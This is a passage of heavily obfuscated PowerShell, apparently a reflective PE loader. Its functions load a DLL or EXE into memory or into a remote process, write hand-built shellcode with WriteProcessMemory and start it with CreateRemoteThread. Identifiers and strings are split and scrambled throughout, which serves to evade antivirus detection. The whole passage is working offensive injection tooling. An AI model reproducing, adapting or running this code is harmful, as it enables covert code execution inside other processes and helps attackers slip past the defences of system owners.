			if (${NA`me} -ceq ${FUN`C`TIoNna`mE})
			{
				
				
				${ORd`INa`LpTr} = &("{3}{6}{0}{1}{5}{4}{2}"-f'ne','d','ned','Add','sig','IntAsUn','-Sig') (${P`ehAn`D`LE}) (${EXp`OrtT`ABlE}."addR`E`S`so`FnAMeORDINAlS" + (${i} *   $15Y4hS::"SIZ`E`OF"([Type][UInt16])))
				${f`U`NCIndeX} =   ( &("{1}{0}" -f'R','DI')  ('v'+'Ar'+'IAbL'+'E:15'+'y4Hs')  )."VaL`Ue"::"PTRtO`strUcT`U`RE"(${O`R`DiNaLp`Tr}, [Type][UInt16])
				${fu`NCOf`FSe`TA`Ddr} = &("{5}{3}{1}{6}{2}{4}{0}" -f'igned','d-SignedI','s','d','Uns','A','ntA') (${pe`hANd`lE}) (${Ex`p`or`TtabLE}."aDdreSS`o`FFU`Nc`TIo`Ns" + (${f`U`NCiNDEx} *  $15Y4hS::"s`IzE`Of"([Type][UInt32])))
				${FUnc`Off`s`et} =  (  &('Ls')  ("varia"+"BL"+"e:15Y"+"4"+"hS")  )."vA`lue"::"Pt`RTOSt`RU`CTU`Re"(${fUNcO`Ff`sE`TaDdr}, [Type][UInt32])
				return &("{1}{3}{2}{4}{0}" -f 'IntAsUnsigned','Add-S','ne','ig','d') (${PE`HANdLE}) (${FUNCO`FF`sET})
			}
		}
		
		return   $1i2L::"ZE`Ro"
	}


	Function InvoK`e-me`MoRYLoA`dLIb`RARy
	{
		Param(
		[Parameter( pOsITiON = 0, MaNdaTORY = ${tR`UE} )]
		[Byte[]]
		${pEB`Y`TES},
		
		[Parameter(posITIon = 1, mAnDATORY = ${F`ALSe})]
		[String]
		${E`x`EaRgs},
		
		[Parameter(POsItiON = 2, MANDaTOry = ${FAL`se})]
		[IntPtr]
		${Re`MOTeP`RO`C`haNDLe}
		)
		
		${p`TR`SiZE} =   (&('ls') VAriABLE:15Y4hs)."vA`lUe"::"sIz`EoF"([Type][IntPtr])
		
		
		${WiN32`Co`Ns`Ta`Nts} = &("{1}{0}{2}{3}"-f 'et','G','-','Win32Constants')
		${W`IN32`FU`N`CTioNS} = &("{0}{3}{1}{2}"-f 'Get-','n32Function','s','Wi')
		${wi`N3`2Ty`PeS} = &("{3}{1}{2}{0}"-f '2Types','-Wi','n3','Get')
		
		${REMOt`eloA`dI`Ng} = ${f`Al`SE}
		if ((${REm`OTEpr`ochA`NDLE} -ne ${N`UlL}) -and (${rEmOteprO`c`haNd`lE} -ne  $1i2L::"z`Ero"))
		{
			${reMOte`LO`A`D`INg} = ${t`Rue}
		}
		
		
		&("{3}{1}{0}{2}{4}" -f 'r','rite-Ve','b','W','ose') ("{5}{2}{1}{6}{7}{4}{0}{3}{8}" -f'e',' P','ic',' ',' from th','Getting bas','E in','formation','file')
		${pEi`NFO} = &("{3}{1}{2}{0}" -f 'nfo','et-PEBa','sicI','G') -PEBytes ${P`EbytES} -Win32Types ${WiN`32ty`Pes}
		${OrIg`iN`ALImA`geB`A`SE} = ${pe`iNfO}."oRig`IN`ALima`geb`AsE"
		${N`XC`om`paTibLE} = ${TR`UE}
		if ((${pEIn`Fo}."DLLcHA`RActe`Ri`S`TIcS" -band ${Wi`N32CoNs`T`Ants}."imAGE`_dL`LCHaRActerIST`i`cs`_N`X_`CompAT") -ne ${wi`N32CONs`Ta`Nts}."i`MAG`E`_d`Ll`ChAraCTe`RI`sTICs_nx`_c`OMpaT")
		{
			&("{2}{0}{3}{1}"-f 'rite-Wa','g','W','rnin') ("{8}{9}{1}{5}{7}{6}{4}{0}{10}{3}{2}"-f' ca',' not c','es',' issu','ht','ompatible ','g','with DEP, mi','PE ','is','use') -WarningAction ("{2}{0}{1}" -f'on','tinue','C')
			${Nx`c`OMpAtibLE} = ${FA`LsE}
		}
		
		
		
		${pROcesS`64`B`It} = ${tR`UE}
		if (${r`eMOTEl`O`AdiNG} -eq ${T`RUe})
		{
			${k`E`RNel3`2haN`DlE} = ${win32FuNC`Tio`NS}."G`eT`mOduL`EHaNDle"."i`NVOKE"(("{3}{2}{0}{1}" -f'l32.','dll','rne','ke'))
			${reSU`lT} = ${win`32fU`N`ctIonS}."gEt`Proc`Ad`Dr`ESS"."i`Nvo`Ke"(${kER`NEL`32hA`NdlE}, ("{0}{3}{2}{1}" -f'I','s','es','sWow64Proc'))
			if (${rEsu`LT} -eq   (  &("{0}{2}{1}" -f 'vaR','aBlE','I')  1I2L)."VA`LUe"::"Ze`Ro")
			{
				Throw ((("{10}{0}{12}{7}{4}{1}{16}{6}{2}{5}{11}{15}{13}{14}{8}{9}{3}" -f 'ul','IsWow64Proc',' if ta','it',' ','rget proc','nction to determine','t locate','bit ','or 64b','Co','ess is','dnKuM','3','2',' ','ess fu')) -cReplAcE  'KuM',[chAR]39)
			}
			
			[Bool]${wow`64pRO`CE`ss} = ${F`A`LSe}
			${SU`cCEsS} = ${w`IN3`2FUNC`TIO`Ns}."I`sW`OW64ProCe`SS"."I`NvoKe"(${r`EMote`pR`oC`HAndle}, [Ref]${WO`w6`4pROce`Ss})
			if (${S`UC`CEss} -eq ${f`ALSe})
			{
				Throw ("{5}{4}{3}{0}{2}{1}" -f '4Process','d',' faile','ow6',' IsW','Call to')
			}
			
			if ((${wOw6`4PRoCe`sS} -eq ${t`Rue}) -or ((${W`o`w6`4PRoCEsS} -eq ${FAL`SE}) -and ( $15Y4hs::"S`I`zeOF"([Type][IntPtr]) -eq 4)))
			{
				${proc`ESS6`4bIt} = ${F`AL`sE}
			}
			
			
			${pOweR`sheL`l`6`4BiT} = ${TR`Ue}
			if ( (  &("{1}{0}" -f 'ariable','v') 15y4hS )."VAL`UE"::"sI`Ze`oF"([Type][IntPtr]) -ne 8)
			{
				${pOW`ER`sHeL`l6`4Bit} = ${Fa`L`se}
			}
			if (${pOw`E`RSHELl6`4bIt} -ne ${pROce`Ss`64b`IT})
			{
				throw ("{13}{19}{11}{15}{6}{18}{16}{7}{14}{17}{4}{1}{3}{9}{5}{12}{0}{2}{8}{10}"-f'an',' (x86/x64) ','d re','as ','re','ng ','m','rc','mote proce','PE bei','ss','t be','loaded ','PowerShe','hi',' sa',' a','tectu','e','ll mus')
			}
		}
		else
		{
			if ( (&("{0}{1}" -f'g','Ci') ('vA'+'r'+'IABlE:15Y4'+'HS'))."vA`luE"::"sIZ`eoF"([Type][IntPtr]) -ne 8)
			{
				${Pr`oCeS`s64bit} = ${FAl`SE}
			}
		}
		if (${PRocE`Ss`64bIT} -ne ${pein`FO}."Pe64`B`iT")
		{
			Throw ((("{16}{14}{18}{0}{5}{13}{10}{1}{3}{17}{12}{6}{15}{7}{11}{2}{9}{8}{4}" -f 's','matc',' being','h th','32/64bit)','nO5','of','ess it i',' in (',' loaded','t ','s','tecture ','y','E pl',' the proc','P','e archi','atform doe'))."r`E`PlaCe"(([CHAR]79+[CHAR]53+[CHAR]121),[stRiNG][CHAR]39))
		}
		

		
		&("{3}{2}{1}{0}"-f'se','bo','ite-Ver','Wr') ("{4}{7}{14}{0}{6}{8}{11}{13}{2}{3}{9}{5}{10}{1}{12}"-f'y f','mo','s ','h','Allocating m','ers t','or the','emo',' PE a','ead','o me','nd write','ry',' it','r')
		
		[IntPtr]${LO`A`DA`Ddr} =   $1i2l::"zE`RO"
		if ((${Pe`INFO}."dlLcHA`RAC`T`ERI`sT`iCS" -band ${WI`N32ConST`A`NtS}."im`AGE_DLlcH`ARact`eRI`sTic`S_DY`N`A`MIc`_BAse") -ne ${wIN`32conS`Tan`TS}."IMag`e_dlLchaRAC`TEriS`TICS`_d`Yn`Ami`C_baSE")
		{
			&("{1}{0}{2}" -f 'rite-Wa','W','rning') ("{19}{0}{11}{17}{12}{1}{14}{8}{5}{4}{9}{6}{10}{7}{15}{20}{2}{13}{16}{18}{3}"-f 'being re','not ASLR','ing Po','ying again','If the ','ble. ',' fails,','res','ompati','loading',' try ','flective','ed is ','werShell an',' c','tar','d t','ly load','r','PE file ','t') -WarningAction ("{0}{2}{1}" -f 'C','inue','ont')
			[IntPtr]${Load`A`ddR} = ${ORI`gi`NAlIMag`ebASe}
		}

		${p`e`HandLe} =   (&("{1}{0}"-f 'ci','G')  vARIAblE:1I2L  )."vAL`UE"::"Ze`Ro"				
		${EF`Fe`c`TiVE`pEHanD`LE} =   (&("{2}{1}{0}" -f'le','ARIAb','v')  ("1"+"i2l")  )."vAl`Ue"::"ZE`RO"		
		if (${remoT`el`oADIng} -eq ${t`RUE})
		{
			
			${pe`han`Dle} = ${W`in3`2`FUncTIoNs}."V`IrtuaL`ALloc"."Inv`oke"(  $1i2L::"Z`ERO", [UIntPtr]${P`EiNfO}."s`IZE`o`FimAGe", ${wiN`32`CoNs`TANTs}."M`em_CoMm`IT" -bor ${WI`N`3`2C`OnsTAnTs}."ME`m_RE`sER`VE", ${WiN32Con`S`Ta`N`TS}."P`Age_ReADW`RIte")
			
			
			${eFfectI`VE`p`eHANdlE} = ${W`in32fU`NC`TIOns}."vIRTUa`LaLL`o`ceX"."I`NV`OKe"(${Re`mOtEP`Rochan`DLE}, ${l`o`AD`AddR}, [UIntPtr]${PeI`N`FO}."sIZ`eoFI`mA`Ge", ${w`IN3`2`cONsTan`Ts}."me`m_co`mMiT" -bor ${wI`N32con`st`A`NtS}."MEm_`ReSe`Rve", ${Wi`N`32ConstA`N`Ts}."pAgE`_`exe`CuTe_rea`DWriTE")
			if (${eF`FEcTIVEPehan`d`le} -eq   $1I2L::"Z`eRo")
			{
				Throw ((("{6}{0}{1}{2}{21}{20}{9}{13}{26}{10}{33}{41}{24}{27}{39}{37}{8}{34}{23}{30}{18}{11}{25}{19}{14}{35}{31}{16}{15}{4}{28}{17}{3}{36}{22}{12}{29}{32}{5}{40}{38}{7}" -f 'le t','o',' a','the r','b','s','Unab',' in use','he PE bein','or','h','doesn','ad','y ','t A','uld ','co','at ',' ','r',' mem','llocate','se ','ad','re','{0}t suppo','in t','mote process.','e th','d','ed',' ','res','e','g lo','SLR, it','equested ba','t','y',' If ',' of the PE is alread',' '))  -f[chaR]39)
			}
		}
		else
		{
			if (${NxcO`M`Pa`TiBLe} -eq ${tr`UE})
			{
				${PE`hAnDLE} = ${wIN32`FuNCtI`oNs}."viR`TUalAlL`OC"."iNvo`kE"(${lOA`DA`D`DR}, [UIntPtr]${P`EiN`FO}."sizeO`FI`MA`ge", ${w`In32cOnS`T`AnTs}."mem_`C`omMit" -bor ${WIn32cO`Ns`Ta`NTS}."Me`m_`RESEr`VE", ${W`IN3`2c`OnStANTS}."pAge_RE`A`dWR`i`TE")
			}
			else
			{
				${p`EHa`NDle} = ${win3`2fUnC`T`iOns}."Vi`RTuaL`AllOc"."i`N`Voke"(${LoA`da`ddR}, [UIntPtr]${pE`iNFO}."s`IZe`oFImaGe", ${Wi`N32`CO`NStANTS}."MeM`_`CommiT" -bor ${W`in32Co`NS`TaNtS}."M`EM_RESE`RVe", ${wiN3`2`COn`staN`TS}."paGE`_EXEc`U`Te_`Rea`DW`RiTe")
			}
			${efFEcT`IV`eP`EHandLE} = ${P`eHA`N`dLe}
		}
		
		[IntPtr]${peE`NDAdDr`ess} = &("{4}{5}{3}{2}{0}{1}"-f'AsU','nsigned','Int','ed','A','dd-Sign') (${PEH`And`le}) ([Int64]${p`EInFo}."sizEof`i`MaGE")
		if (${pEha`N`DLe} -eq  $1i2l::"Ze`Ro")
		{ 
			Throw (("{26}{15}{13}{19}{8}{5}{12}{30}{6}{33}{0}{28}{49}{9}{11}{22}{2}{31}{27}{4}{3}{7}{10}{46}{14}{50}{36}{43}{44}{29}{16}{34}{41}{1}{20}{37}{42}{17}{40}{21}{47}{24}{38}{45}{18}{25}{23}{32}{39}{48}{35}"-f' If','ve ','ASLR ','e,','tibl','i','e ',' try run','c fa','is ','n','no','led to allo','Al','c','irtual','ss will ','nt','r','lo','a d','e','t ','the ','ayo','ess ','V','a',' ','l proce','cat','comp','PE wa','memory for PE.','h','ee).','PowerShell pr','i','ut, so the a','nts might',' m','a','ffere','ocess (the new P','owerShel','dd','ing the s','mory l',' be fr','PE ','ript in a new '))
		}		
		  ( &("{0}{1}" -f'IT','EM') ('vaR'+'IaBLE:15Y4h'+'s'))."vA`LuE"::("{0}{1}"-f 'Co','py').Invoke(${P`EbYTEs}, 0, ${p`eHANDle}, ${PE`INFo}."sizEOF`H`EadErS") | &("{1}{0}{2}"-f 't-N','Ou','ull')
		
		
		
		&("{0}{1}{2}" -f'Writ','e','-Verbose') ("{4}{6}{15}{8}{1}{10}{3}{13}{0}{9}{2}{12}{5}{14}{11}{7}" -f 'ers','PE i','lo','ormation f','Gettin','d in','g det','mory',' ',' ','nf','me','ade','rom the head',' ','ailed')
		${p`E`InFO} = &("{3}{5}{2}{0}{4}{1}" -f 'aile','nfo','t','Get','dI','-PEDe') -PEHandle ${peHA`NdlE} -Win32Types ${wIN`32Ty`Pes} -Win32Constants ${win32ConS`TA`N`Ts}
		${Pe`I`NFO} | &("{2}{0}{1}" -f 'Mem','ber','Add-') -MemberType ("{1}{3}{2}{0}"-f 'rty','NoteP','ope','r') -Name ("{2}{0}{1}"-f 'Ad','dress','End') -Value ${pe`E`NDad`drEsS}
		${pE`InFO} | &("{1}{0}{2}" -f'dd-M','A','ember') -MemberType ("{1}{0}{2}{3}" -f 't','No','eProp','erty') -Name ("{3}{0}{1}{2}"-f 'fectivePEHa','n','dle','Ef') -Value ${efFEcTivep`e`haN`d`LE}
		&("{1}{2}{0}{3}" -f'-Verbo','W','rite','se') ('Start'+'Add'+'r'+'ess: '+"$PEHandle "+' '+' '+' '+'E'+'n'+'dAddre'+'ss: '+"$PEEndAddress")
		
		
		
		&("{3}{0}{2}{1}"-f 'ite','e','-Verbos','Wr') ("{1}{0}{5}{3}{4}{2}{6}"-f 'ct','Copy PE se',' in to me','o','ns','i','mory')
		&("{1}{2}{3}{0}" -f'ions','Copy-','S','ect') -PEBytes ${P`ebYT`ES} -PEInfo ${P`eInFO} -Win32Functions ${Wi`N`32FUNCTIONs} -Win32Types ${WI`N32tYp`eS}
		
		
		
		&("{0}{2}{1}"-f 'Write','se','-Verbo') ("{8}{0}{12}{6}{10}{3}{14}{4}{5}{11}{1}{15}{19}{9}{13}{17}{2}{7}{18}{16}" -f 'at','a','oad',' a','dr','esses','or','ed in ','Upd','s','y',' b','e mem',' ','d','sed o','ry','actually l','memo','n where the PE wa')
		&("{5}{6}{2}{0}{4}{1}{3}"-f 'r','ss','ryAdd','es','e','Updat','e-Memo') -PEInfo ${P`E`INFO} -OriginalImageBase ${O`RI`ginaLiMAG`e`BASe} -Win32Constants ${win3`2CoNsT`A`NTs} -Win32Types ${wIN`32`Ty`PES}

		
		
		&("{2}{1}{0}" -f 'e','rite-Verbos','W') ((("{2}{0}{3}{7}{9}{1}{8}{5}{6}{4}{10}" -f 's ','th','Import DLLUp5','needed ','e','PE we ','ar','b','e ','y ',' loading'))-CREPlace ([cHAr]85+[cHAr]112+[cHAr]53),[cHAr]39)
		if (${re`M`oTeloA`d`InG} -eq ${t`RUe})
		{
			&("{2}{1}{0}{3}{4}"-f 'l','D','Import-','lImport','s') -PEInfo ${Pe`I`NFO} -Win32Functions ${W`iN`32f`UNCTIOns} -Win32Types ${w`in32`Ty`PeS} -Win32Constants ${wIn32`cO`Ns`T`ANTs} -RemoteProcHandle ${Rem`OTeP`ROc`HAND`lE}
		}
		else
		{
			&("{0}{3}{2}{4}{1}"-f 'I','rts','lI','mport-Dl','mpo') -PEInfo ${p`EInfO} -Win32Functions ${WIn`32F`Unc`TionS} -Win32Types ${Win32`T`Y`PES} -Win32Constants ${wIN`32`coNsTANTS}
		}
		
		
		
		if (${r`eMoTe`lO`Ading} -eq ${fA`lSe})
		{
			if (${n`Xc`ompatI`BLE} -eq ${T`Rue})
			{
				&("{1}{0}{2}" -f'-V','Write','erbose') ("{5}{3}{6}{7}{0}{1}{2}{4}" -f'tecti','on ','fl','ate me','ags','Upd','mo','ry pro')
				&("{3}{8}{5}{2}{0}{7}{1}{4}{6}" -f'rot','nF','ryP','Upd','lag','mo','s','ectio','ate-Me') -PEInfo ${pei`N`FO} -Win32Functions ${w`I`N`32FuNCtiONS} -Win32Constants ${WiN`3`2Co`NstANts} -Win32Types ${W`IN32`T`YpES}
			}
			else
			{
				&("{0}{2}{1}"-f 'Wri','-Verbose','te') ("{9}{7}{14}{26}{0}{18}{6}{21}{5}{16}{4}{24}{2}{20}{13}{15}{11}{8}{19}{1}{3}{10}{17}{23}{22}{12}{25}"-f 'ef','as ','ory,','read','NX ','p',' i','E bei','mor','P',' ','e','e exe','g ','ng','m','atible with ','wr','lectively loaded','y ',' keepin','s not com','t','i','mem','cute',' r')
			}
		}
		else
		{
			&("{1}{2}{3}{0}"-f 'e','Wri','te-V','erbos') ("{0}{14}{8}{2}{10}{13}{4}{5}{6}{12}{9}{11}{7}{1}{3}"-f 'PE bein','si','ed in t','ons','rem','o','te proc','ry permis',' load','ju','o a','sting memo','ess, not ad',' ','g')
		}
		
		
		
		if (${ReMOTEl`OAd`ing} -eq ${t`RUe})
		{
			[UInt32]${NU`m`BYt`ESWRIT`TEN} = 0
			${S`UcC`EsS} = ${wiN`3`2`FUNCTIoNs}."wrItePR`Oc`e`SsMeMORy"."Inv`OKe"(${ReM`oTEP`R`OC`h`AndlE}, ${Ef`FeCtIVePe`ha`NdLE}, ${pe`H`AnD`LE}, [UIntPtr](${PeIn`Fo}."si`zE`ofiM`AgE"), [Ref]${nu`M`By`TeSWRiTtEN})
			if (${S`UCCesS} -eq ${fA`l`se})
			{
				Throw ("{11}{9}{3}{0}{7}{2}{1}{8}{10}{5}{6}{4}{12}" -f ' write shel','de to rem','o',' to','ss ','r','oce','lc','ot','ble','e p','Una','memory.')
			}
		}
		
		
		
		if (${peIn`Fo}."F`iLeTYpe" -ieq "DLL")
		{
			if (${ReMO`T`eLoAD`Ing} -eq ${f`A`LSE})
			{
				&("{0}{4}{2}{1}{3}"-f'W','er','e-V','bose','rit') ("{0}{4}{3}{1}{6}{2}{8}{9}{5}{7}"-f 'Callin','h',' DLL ','n so t','g dllmai','as been lo','e','aded','knows it ','h')
				${d`lLm`Ai`NPtr} = &("{4}{5}{1}{2}{0}{3}"-f 'U','gnedI','ntAs','nsigned','Add-','Si') (${PeI`Nfo}."peHAN`DlE") (${pE`I`NFO}."IMAge_`NT_HeaDE`Rs"."oPTI`On`A`lhEad`eR"."ADDrE`sSOfeNTry`p`oint")
				${dLLM`A`I`NdE`l`egAtE} = &("{1}{2}{3}{0}"-f 'e','Get-D','elegateTy','p') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${DL`lmaIN} =   $15Y4HS::("{5}{4}{1}{2}{3}{0}"-f'er','eFo','rFun','ctionPoint','t','GetDelega').Invoke(${dllm`AiN`ptR}, ${d`LlmaINDel`egA`Te})
				
				${DL`L`MaIn}."iN`V`Oke"(${pei`NfO}."pE`ha`NdlE", 1,  ( &('ls') vaRiABLE:1i2l  )."V`Alue"::"Ze`RO") | &("{0}{1}" -f 'Out','-Null')
			}
			else
			{
				${DLL`MAi`NptR} = &("{0}{5}{1}{2}{4}{3}{6}" -f 'Add-','gned','Int','ns','AsU','Si','igned') (${ef`FecTiVeP`eHa`N`dLE}) (${PEi`NFo}."im`A`gE_nT_Hea`dErs"."o`ptIoN`ALheA`DeR"."AdD`ReSSOfE`NtR`Y`Po`int")
			
				if (${pEi`NFO}."PE`64B`it" -eq ${Tr`Ue})
				{
					
					${CA`LlDlL`MaInS`c1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${C`ALlDlLmAin`sc2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${CaLLd`L`L`mAINsC3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					${cal`LDlLmai`NS`C1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${cAlld`Ll`MAINs`c2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${caL`Ldl`lm`AinSC3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${sc`lEngTH} = ${CAL`L`dLlmaINs`C1}."l`e`NGTh" + ${caLl`dLL`MAIn`s`c2}."leN`G`Th" + ${cA`l`ld`L`lmAInSC3}."L`E`NgtH" + (${pt`R`sIzE} * 2)
				${scp`S`mEm} =  (&("{2}{0}{1}" -f'e','m','GET-IT') ('v'+'ArI'+'AbLE:15y'+'4'+'Hs')  )."v`ALUe"::("{0}{1}{2}" -f 'AllocHGlo','ba','l').Invoke(${scL`eN`gTH})
				${ScPSMEM`OriGi`N`Al} = ${s`CpS`mEM}
				
				&("{2}{4}{0}{3}{1}" -f 'ToMemo','y','Writ','r','e-Bytes') -Bytes ${cAl`ldl`LMA`I`NSc1} -MemoryAddress ${S`cpsM`eM}
				${s`c`psMEm} = &("{5}{4}{2}{1}{0}{3}"-f 'ns','U','s','igned','gnedIntA','Add-Si') ${SCPS`mem} (${c`AlL`DlLMAIns`c1}."LE`Ng`Th")
				  ( &("{2}{3}{0}{1}"-f 'aRIAbl','e','GEt','-v')  15y4hS )."v`AlUe"::("{2}{3}{1}{0}"-f'eToPtr','ctur','S','tru').Invoke(${EFfECtiV`Epehan`d`LE}, ${S`cPS`meM}, ${Fa`lSe})
				${s`Cp`Smem} = &("{3}{0}{2}{1}"-f'dIntAs','nsigned','U','Add-Signe') ${S`c`PSmem} (${PTR`Si`ze})
				&("{4}{3}{1}{0}{2}"-f'r','o','y','oMem','Write-BytesT') -Bytes ${caLldL`lM`A`iN`SC2} -MemoryAddress ${sc`psm`EM}
				${Sc`p`Smem} = &("{3}{4}{0}{2}{1}{5}"-f 't','sUnsig','A','Add','-SignedIn','ned') ${s`cpsm`em} (${C`Al`LDLLM`AInsC2}."LEN`Gth")
				 (  &("{0}{2}{1}"-f'GEt-','tem','i') vARIaBle:15Y4HS  )."V`ALUE"::("{2}{3}{0}{1}" -f'uctureToP','tr','S','tr').Invoke(${DlLma`in`Ptr}, ${s`CP`SMem}, ${F`ALSE})
				${SCps`m`eM} = &("{4}{0}{1}{2}{3}"-f'n','t','As','Unsigned','Add-SignedI') ${SCP`SMEM} (${pTR`Si`Ze})
				&("{1}{2}{3}{0}" -f 'ytesToMemory','Wr','i','te-B') -Bytes ${CA`Ll`DlLM`AINsc3} -MemoryAddress ${sC`p`smEm}
				${Scpsm`Em} = &("{3}{0}{5}{1}{6}{2}{4}" -f 'dd-S','nedI','igne','A','d','ig','ntAsUns') ${scp`sM`eM} (${caLLdll`M`Ai`NsC3}."L`e`Ngth")
				
				${Rs`cA`DdR} = ${win`32`FuncTIo`NS}."ViRTuA`lAll`O`Cex"."Invo`kE"(${REMOTepr`O`C`HAn`Dle},   ( &("{0}{1}"-f 'gc','i')  ('VaR'+'iABLe:'+'1i2L') )."VA`LUE"::"Z`eRo", [UIntPtr][UInt64]${ScL`En`Gth}, ${Win32`cO`Ns`TanTs}."m`EM_comM`IT" -bor ${W`in`32CONSTANTs}."ME`M`_re`SerVe", ${WI`N3`2co`Ns`TANTs}."p`AGe_EX`ECu`Te_Re`A`DWr`iTe")
				if (${rS`ca`DdR} -eq   (&('gI')  ("V"+"ariAB"+"lE:1i2"+"L") )."vA`lUe"::"ZE`RO")
				{
					Throw ("{16}{15}{5}{12}{9}{4}{8}{11}{1}{2}{7}{3}{0}{10}{14}{13}{6}"-f 'oces',' the',' remot','r','at','bl','e','e p','e ',' alloc','s for shellc','memory in','e to','d','o','na','U')
				}
				
				${sU`c`CesS} = ${wIn`32`Fu`NCtionS}."wR`ITEPRoc`E`ssme`mO`RY"."I`NvoKE"(${Re`M`OtEp`Ro`cHANDLe}, ${RScA`d`dR}, ${s`Cp`s`MEmoriGINAL}, [UIntPtr][UInt64]${SCleN`G`TH}, [Ref]${nUMbYt`ESWr`i`TTEn})
				if ((${suCc`E`Ss} -eq ${F`AL`sE}) -or ([UInt64]${Nu`MbY`TE`sWRIT`Ten} -ne [UInt64]${sc`Len`GTH}))
				{
					Throw ("{12}{6}{11}{7}{4}{3}{13}{10}{0}{2}{8}{5}{1}{9}{14}" -f'ode','proce',' t','e shel','writ','te ','n','ble to ','o remo','ss m','c','a','U','l','emory.')
				}

				${rtHrE`A`d`HAndLE} = &("{3}{2}{0}{1}{4}"-f'mote','Th','e','Invoke-CreateR','read') -ProcessHandle ${reMOt`E`pRocH`A`N`DLe} -StartAddress ${rS`ca`ddr} -Win32Functions ${W`iN32fU`Nc`T`IOns}
				${rESU`Lt} = ${wI`N32FUnc`T`IONs}."waIt`FOrSING`LeO`BJecT"."I`Nv`Oke"(${RTh`R`e`AdhAndLe}, 20000)
				if (${Re`SU`LT} -ne 0)
				{
					Throw ("{3}{7}{9}{4}{8}{5}{6}{0}{10}{1}{2}"-f'call G','Addre','ss failed.','C','e','r','ead to ','all to Creat','Th','eRemot','etProc')
				}
				
				${W`i`N32f`UN`CtiOnS}."vi`Rtual`FreEeX"."INvo`ke"(${REmoT`e`P`RO`cHan`dLE}, ${r`ScAD`Dr}, [UIntPtr][UInt64]0, ${wIn32Co`N`stAn`Ts}."mem`_R`e`LeasE") | &("{2}{0}{1}"-f't-Nul','l','Ou')
			}
		}
		elseif (${pE`InFo}."fI`LEt`YPE" -ieq "EXE")
		{
			
			[IntPtr]${E`xEdoNe`Bytep`Tr} =  (&("{0}{1}"-f 'vARI','ABlE')  ("15y4"+"hS"))."Val`UE"::("{1}{0}{3}{2}" -f 'l','A','l','locHGloba').Invoke(1)
			  $15y4Hs::("{1}{0}{2}"-f 'B','Write','yte').Invoke(${exeDON`EbYTE`p`Tr}, 0, 0x00)
			${OvERW`RITT`enM`E`mIn`FO} = &("{1}{0}{2}{3}{4}"-f 'ate-','Upd','ExeFunc','t','ions') -PEInfo ${p`eiNfO} -Win32Functions ${Wi`N3`2FUncTions} -Win32Constants ${wIn3`2CoNS`TANTS} -ExeArguments ${EXE`ArGs} -ExeDoneBytePtr ${ExE`dO`NEByT`EPtr}

			
			
			[IntPtr]${EX`em`A`InPTr} = &("{0}{1}{2}{6}{3}{4}{5}" -f 'A','dd','-SignedI','sUnsig','ne','d','ntA') (${pe`i`NfO}."PehAnD`le") (${pEi`N`FO}."Im`AgE_n`T_hEaD`Ers"."OPT`ioNal`hEadER"."a`D`D`Res`sOfEntrY`PoinT")
			&("{1}{2}{0}"-f'ose','Write-','Verb') ('C'+'all '+'EX'+'E '+'Mai'+'n '+'f'+'u'+'nc'+'tion. '+'Ad'+'d'+'ress: '+"$ExeMainPtr. "+'Cre'+'atin'+'g '+'threa'+'d'+' '+'f'+'or '+'th'+'e '+'EX'+'E '+'t'+'o '+'run'+' '+'i'+'n.')

			${WIn32`F`Unct`IONs}."creA`T`EtHREad"."in`V`OKE"(  $1I2l::"Z`ERO",   (&("{1}{2}{3}{0}"-f 'E','GeT-v','ARI','aBL') 1I2l  -vaLUe )::"z`ErO", ${E`x`Emai`NPTr},   $1I2L::"z`ERO", ([UInt32]0), [Ref]([UInt32]0)) | &("{2}{0}{1}" -f '-Nu','ll','Out')

			while(${tR`Ue})
			{
				[Byte]${ThRE`Ad`DO`NE} =  (  &("{0}{1}" -f 'gC','I')  variABLE:15Y4hS)."vAl`UE"::("{1}{0}"-f'dByte','Rea').Invoke(${eXe`DO`Neb`yTEptR}, 0)
				if (${t`HrE`A`DDOne} -eq 1)
				{
					&("{2}{1}{7}{4}{3}{6}{5}{0}" -f 's','p','Co','ArrayOfMemA','-','se','ddres','y') -CopyInfo ${oVe`R`WR`iTTeN`memInfo} -Win32Functions ${w`IN32fUnCTI`o`NS} -Win32Constants ${win`32`CONStA`N`TS}
					&("{1}{0}{2}"-f'te-Verbos','Wri','e') ("{6}{2}{4}{3}{0}{5}{1}"-f'l','ted.','d h','comp','as ','e','EXE threa')
					break
				}
				else
				{
					&("{0}{2}{1}"-f'Start-S','eep','l') -Seconds 1
				}
			}
		}
		
		return @(${P`e`InFo}."PEh`AND`LE", ${eFFE`Ct`iv`ePE`HAND`Le})
	}
	
	
	Function INV`Ok`e-M`emorYfr`eEL`iBrarY
	{
		Param(
		[Parameter(PositIoN=0, mAndaToRy=${Tr`UE})]
		[IntPtr]
		${PE`h`ANdlE}
		)
		
		
		${Wi`N32cOns`T`A`NTS} = &("{0}{1}{4}{5}{2}{3}"-f'Ge','t-','a','nts','Win32C','onst')
		${WIn`3`2FUncti`O`Ns} = &("{3}{1}{0}{2}" -f 'n32','Wi','Functions','Get-')
		${Win32t`Y`PES} = &("{1}{3}{0}{2}" -f 'in','Ge','32Types','t-W')
		
		${PeIn`Fo} = &("{1}{4}{2}{3}{0}"-f'o','Get-PED','edIn','f','etail') -PEHandle ${p`eHA`NDLe} -Win32Types ${W`I`N32T`YPEs} -Win32Constants ${W`in3`2coNSTan`Ts}
		
		
		if (${P`EIn`Fo}."IM`Ag`e_nt_HEAd`ERs"."OPT`Ion`ALhea`DER"."impor`TT`AB`lE"."SI`Ze" -gt 0)
		{
			[IntPtr]${ImpOrtd`eS`cRiP`ToR`PtR} = &("{0}{5}{3}{4}{1}{2}"-f 'A','nsig','ned','d-Sig','nedIntAsU','d') ([Int64]${peIn`Fo}."peH`AN`DlE") ([Int64]${PE`Info}."IMag`e_N`T_`He`ADErs"."OpT`iO`NAlH`EAder"."IMP`oR`T`TabLE"."VIrtUa`l`ADDRess")
			
			while (${T`RUe})
			{
